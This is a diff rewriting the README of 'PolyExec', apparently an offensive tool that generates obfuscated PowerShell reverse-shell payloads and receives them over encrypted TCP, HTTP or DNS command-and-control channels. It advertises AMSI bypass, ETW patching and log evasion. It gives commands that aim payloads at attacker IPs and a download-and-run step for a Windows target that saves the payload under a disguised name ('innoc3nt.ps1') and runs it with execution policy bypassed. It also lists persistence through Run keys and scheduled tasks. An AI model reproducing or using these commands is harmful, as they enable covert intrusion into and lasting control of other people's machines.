@@ -1,2 +1,72 @@
-# PolyExec
-Polymorphic PowerShell Exec Framework in Python. Defender Evasion Techniques, Encrypted C2 Tunnel, Poly PS Payload Generation.
+## PolyExec: Generate polymorphic ps payloads and catch the shells in an aes-256 tunnel. 
+#### This program is only tested on one pair of OSs at the moment.
+
+
+### C2: <br>
+
+TCP - Basic reverse shell (simple)<br>
+Encrypted - AES-256 encrypted TCP (normal)<br>
+HTTP - HTTP/HTTPS (80 or 443)<br>
+DNS - DNS(sneaky)<br>
+AES-256<br>
+multi session threaded<br>
+custom keys<br>
+
+### Evasion features:<br>
+AMSI bypass<br>
+ETW patching<br>
+scriptBlock log bypass<br>
+prng variable names<br>
+junk code<br>
+no two payloads alike<br>
+Traffic jitter<br>
+
+# I NO READ! I USE NOW:<br>
+    ### Encrypted shell -- full evasion
+    ./polyexecgen.py -t 192.168.1.100 -p 4444 -m encrypted -k mygoodpassword
+    
+    ### basic TCP sh
+    ./polyexecgen.py -t 192.168.1.100 -p 4444 -m tcp
+    
+    ### HTTP --  web traffic
+    ./polyexecgen.py -t http://192.168.1.100:8080/shell -m http -k myk3y
+    
+    ### DNS C2 (sneaky)
+    ./polyexecgen.py -m dns --dns-domain c2.example.com
+<br>
+<br>
+
+## start the sh3ll catch3r: <br>
+
+### For encrypted mode:
+
+<br>
+
+     python3 c2_catcher.py
+
+### Host the payload:
+
+    python3 -m http.server 8000
+
+### powershell On Windows target:
+
+    Invoke-WebRequest http://192.168.1.5:6969/payloads/polyexec_encrypted_*.ps1 -OutFile innoc3nt.ps1
+    powershell.exe -ExecutionPolicy Bypass -File innocent.ps1
+
+### persistance:
+
+ payload w/ auto install persistence:
+ 
+    ./polyexecgen.py -t 192.168.1.100 -p 4444 -m encrypted --persist
+
+ Adds:
+ - Registry Run key
+ - Scheduled task at logon
+ - File copy to %APPDATA%
+ 
+--- 
+
+### polyexecgen.py - Generate obfuscated PS payloads <br>
+### c2_catcher.py - Receive the encrypted tunnel
+ <br>
+ <br>
